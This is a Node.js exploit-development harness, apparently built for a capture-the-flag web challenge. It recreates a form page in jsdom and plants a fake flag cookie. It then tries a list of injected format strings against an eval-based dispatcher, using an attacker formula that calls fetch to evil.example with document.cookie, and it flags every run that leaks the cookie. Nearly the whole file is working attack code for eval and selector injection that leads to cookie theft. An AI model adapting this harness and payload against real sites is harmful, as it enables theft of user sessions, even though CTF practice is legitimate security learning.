"use strict";
const { JSDOM } = require("jsdom");
const dom = new JSDOM(
  `<!DOCTYPE html><html><body>
     <form id="poly_standard" data-formula="x+y">
       <input id="x_standard" name="x" value="1">
       <input id="y_standard" name="y" value="2">
       <input name="formula" value="x + y">
       <div id="template_standard" hidden></div>
     </form><pre id="answer"></pre></body></html>`,
  { url: "https://polynomial.secso.cc/" }
);
global.window = dom.window; global.document = dom.window.document;
global.navigator = dom.window.navigator;
global.top = dom.window; global.self = dom.window; global.parent = dom.window;
global.frames = dom.window; global.globalThis = dom.window;
const $ = require("jquery");
dom.window.document.cookie = "flag=FLAG{fake}";
dom.window.name = 'MARK_WINDOW_NAME';

let exfil = [];
const hit = (t,v)=>exfil.push(t+":"+String(v).slice(0,60));
dom.window.fetch = global.fetch = (u)=>{hit("fetch",u);return Promise.resolve({});};
dom.window.Image = global.Image = class{set src(v){hit("img",v);}};
dom.window.open = global.open = (u,n)=>hit("open",u+"|"+n);
dom.window.alert = global.alert = (a)=>hit("alert",a);
try{dom.window.navigator.sendBeacon=(u,d)=>{hit("beacon",u);return true;};}catch(e){}
try{$.globalEval=(c)=>hit("globalEval",c);}catch(e){}
global.setTimeout = (h,t)=>{ hit("setTimeout", (typeof h)+"="+String(h)); };
dom.window.setTimeout = global.setTimeout;

function getCurrentFormValues(f){const fd=new dom.window.FormData(f);return {x:String(fd.get("x")||""),y:String(fd.get("y")||""),formula:String(fd.get("formula")||"")};}

function run(format, attackerFormula){
  exfil=[];
  const form=dom.window.document.querySelector("form");
  form.id="poly_"+format;
  if(attackerFormula!==undefined){ form.querySelector('[name=formula]').value=attackerFormula; form.setAttribute("data-formula",attackerFormula); }
  const selected=form.id.replace("poly_","");
  const values=getCurrentFormValues(form);
  let tmpl;
  try{ tmpl=$("#template_"+selected); }catch(e){ return {format,r:"SEL_THROW",d:e.message.slice(0,50),exfil}; }
  if(tmpl.length===0){
    try{
      const ans=(function(selected,values,$){ "use strict"; let type_; return eval("type_"+selected+"(this, selected)"); }).call(form,selected,values,$);
      return {format,r:"EVAL_OK",ans:String(ans).slice(0,30),exfil};
    }catch(e){ return {format,r:"EVAL_THROW",d:e.message.slice(0,60),exfil}; }
  }
  return {format,r:"TMPL_MATCH",exfil};
}

const EXF='fetch("https://evil.example/?c="+document.cookie)';
const battery = [
  ",alert", ",window.alert", ",top.alert",
  ",this.submit",
  ",this.ownerDocument.location.reload",
  ",document.location.reload",
  ",eval",                                  // eval(this)
  ",setTimeout",                            // setTimeout(this,selected)
  ",setInterval",
  ",window.setTimeout",
  ",fetch", ",navigator.sendBeacon", ",open",
  // route through unrestricted formula (values.formula):
  ",values.formula.constructor",            // String(this)
  ",values.formula.constructor.constructor",// Function(this,selected)-> throws
  // selector validity probes with parens:
  ":root", ":scope", ":not(a)", ":is(a)", ":has(a)", ":where(a)", ":contains(a)",
  ",*", ",[a]", ",[a=b]", ",[a='b']", ",a:not(b)", ",a:contains(b)",
  // label attempts
  ":not(a)", ":has(*)",
];
for(const f of battery){
  const r = run(f, EXF);
  const flag = r.exfil && r.exfil.some(x=>x.includes("FLAG{fake}")) ? "  <<< COOKIE EXFIL!" : "";
  console.log(JSON.stringify(r)+flag);
}
